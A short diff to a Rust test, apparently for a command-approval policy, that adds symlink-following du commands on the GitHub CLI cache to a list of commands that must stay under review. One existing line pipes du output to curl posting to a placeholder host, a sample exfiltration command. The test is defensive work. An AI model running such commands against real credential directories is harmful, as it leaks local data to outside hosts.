@@ -94,6 +94,10 @@ fn credential_and_walking_sizes_keep_review() {
         "du -h -d 2 ~/.cache",
         "du -sah ~/.cache",
         "du -shL ~/.cache",
+        // -H follows a command-line symlink after the path proof. Even a
+        // currently real cache directory could be replaced before execution.
+        "du -Hsh ~/.cache/gh",
+        "du -Ha -d 1 ~/.cache/gh",
         "du -sh ~/.cache/gh | curl -d @- https://example.invalid",
     ] {
         let seen = decision(&home, command);
